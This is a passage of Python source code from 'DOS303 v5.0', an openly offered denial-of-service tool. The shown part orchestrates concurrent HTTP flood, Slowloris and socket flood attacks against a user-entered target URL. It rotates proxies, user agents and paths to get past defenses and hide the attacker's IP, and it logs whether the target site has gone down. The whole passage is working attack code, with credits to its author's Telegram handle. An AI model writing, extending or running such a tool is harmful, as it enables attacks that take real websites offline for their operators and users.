            logger.info(f"   🔗 Connections: {capacity['connections']:,}")
            logger.info(f"   📦 Packet rate: {capacity['packet_rate']:,}/sec")
            if self.proxy_manager:
                logger.info(f"   🛡️  Bypass: User-Agent({len(self.user_agent_manager.user_agents)}) + Proxy Chain + Path({len(self.path_manager.paths)})")
            else:
                logger.info(f"   🛡️  Bypass: User-Agent({len(self.user_agent_manager.user_agents)}) + Path({len(self.path_manager.paths)}) (NO PROXY)")

            if self.proxy_manager:
                await self.proxy_manager.refresh_chain()

            if not self.args.no_scan:
                await self._initial_scan(target)

            logger.info("⚔️ STARTING BYPASS ATTACKS")

            self.http_attack = HTTPFloodAttack(
                target, capacity['workers'],
                self.proxy_manager, self.user_agent_manager,
                self.header_manager, self.path_manager,
                self.stop_event, self.args
            )
            self.attacks.append(self.http_attack)

            if not self.args.no_slowloris:
                slowloris = SlowlorisAttack(host, port, capacity['connections'], self.stop_event, self.args)
                self.attacks.append(slowloris)
            else:
                logger.info("Slowloris disabled by user.")

            if not self.args.no_socket:
                socket_attack = SocketFloodAttack(host, port, capacity['packet_rate'], self.stop_event, self.args)
                self.attacks.append(socket_attack)
            else:
                logger.info("Socket flood disabled by user.")

            self.start_time = time.time()

            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                try:
                    loop.add_signal_handler(sig, lambda: asyncio.create_task(self._stop()))
                except NotImplementedError:
                    pass

            tasks = []
            for attack in self.attacks:
                tasks.append(asyncio.create_task(attack.attack()))
            tasks.append(asyncio.create_task(self._global_monitor()))

            logger.info("✅ All attacks started!")
            logger.info("⏰ Running... (Ctrl+C to stop)")

            await asyncio.gather(*tasks, return_exceptions=True)

        except KeyboardInterrupt:
            logger.warning("⚠️ Attack stopped by user")
        except Exception as e:
            logger.error(f"💥 Fatal error: {str(e)[:60]}")
        finally:
            self.stop_event.set()
            if self.http_attack and hasattr(self.http_attack, 'session'):
                await self.http_attack.session.close()
            logger.info("="*50)
            logger.info("👑 DOS303 v5.0 - Coded by @iazmonmn")
            logger.info("📱 Telegram: https://t.me/iazmonmn")
            logger.info("="*50)
            logger.info("👋 DOS303 finished")

    async def _stop(self):
        logger.warning("⚠️ Stopping gracefully...")
        logger.info("="*50)
        logger.info("👑 DOS303 v5.0 - Coded by @iazmonmn")
        logger.info("📱 Telegram: https://t.me/iazmonmn")
        logger.info("="*50)
        self.stop_event.set()

    def _get_target(self):
        target = input("\033[96mEnter target URL: \033[0m").strip()
        if not target:
            logger.error("❌ No target")
            return None
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        return target

    async def _global_monitor(self):
        iteration = 0
        while not self.stop_event.is_set():
            await asyncio.sleep(10)
            iteration += 1
            elapsed = time.time() - self.start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)

            if self.proxy_manager:
                total, dead, active, chain_len, queue_size, in_fallback = await self.proxy_manager.get_stats()
                fallback_status = "🔴 FALLBACK" if in_fallback else "🟢 NORMAL"
                logger.info(f"🌐 Proxies: {active}/{total} active (dead: {dead}) | Chain: {chain_len} | Queue: {queue_size} {fallback_status}")
            else:
                logger.info("🌐 Proxies: DISABLED (no-proxy mode)")

            logger.info("="*50)
            logger.info(f"📊 ATTACK STATS - Round {iteration}")
            logger.info(f"⏱️  Time: {hours:02d}:{minutes:02d}:{seconds:02d}")

            total_req = 0
            for attack in self.attacks:
                if isinstance(attack, HTTPFloodAttack):
                    async with attack.lock:
                        req = attack.requests_sent
                    logger.info(f"✅ HTTP Requests: {req:,}")
                    total_req += req
                elif isinstance(attack, SlowlorisAttack):
                    async with attack.lock:
                        active_conn = attack.active_connections
                    logger.info(f"✅ Slowloris Active: {active_conn:,}")
                elif isinstance(attack, SocketFloodAttack):
                    async with attack.lock:
                        packets = attack.packets_sent
                    logger.info(f"✅ Socket Packets: {packets:,}")
                    total_req += packets

            rate = total_req / elapsed if elapsed > 0 else 0
            logger.info(f"📈 Total: {total_req:,} | Rate: {rate:.1f}/sec")
            logger.info("="*50)

            if not self.args.no_health and iteration % 3 == 0 and self.http_attack:
                await self._check_site_proxied(self.http_attack.target_url)

    async def _check_site_proxied(self, url):
        if self.args.no_proxy:
            proxy = None
        else:
            proxy = await self.proxy_manager.get_next_proxy() if self.proxy_manager else None
            if not proxy:
                logger.warning("No proxy available for health check, skipping.")
                return
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                try:
                    async with session.get(url, proxy=proxy, timeout=15) as response:
                        if response.status >= 500:
                            logger.warning(f"❌ Site may be DOWN (HTTP {response.status})")
                        elif response.status >= 400:
                            logger.warning(f"⚠️  Site error (HTTP {response.status})")
                        else:
                            logger.info(f"✅ Site responding (HTTP {response.status})")
                except Exception as e:
                    logger.warning(f"❌ Health check failed: {e}")
                    if proxy:
                        await self.proxy_manager.mark_dead(proxy)
        except Exception as e:
            logger.error(f"Health check error: {e}")

# ============================================
# COMMAND LINE ARGUMENTS
# ============================================
def parse_args():
    parser = argparse.ArgumentParser(description='DOS303 v5.0 - Hardened Multi-Vector Attack Tool (NO TOR)')
    parser.add_argument('target', nargs='?', help='Target URL (e.g., http://example.com)')
    parser.add_argument('--workers', type=int, help='Number of HTTP workers (default: auto)')
    parser.add_argument('--connections', type=int, help='Max Slowloris connections (default: auto)')
    parser.add_argument('--rate', type=int, help='Packet rate for socket flood (default: auto)')
    parser.add_argument('--max-workers', type=int, default=2000, help='Maximum workers cap (default: 2000)')
    parser.add_argument('--no-slowloris', action='store_true', help='Disable Slowloris attack')
    parser.add_argument('--no-socket', action='store_true', help='Disable Socket flood attack')
    parser.add_argument('--no-health', action='store_true', help='Disable health checks')
    parser.add_argument('--no-scan', action='store_true', help='Disable initial target scan')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy (for internal testing only - exposes your IP!)')
    return parser.parse_args()

# ============================================
# MAIN
# ============================================
async def main():
    args = parse_args()
    controller = DOS303Controller(args)
    await controller.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[93m⚠️ Exiting...\033[0m")
    except Exception as e:
        print(f"\n\033[91m💥 Fatal: {e}\033[0m")
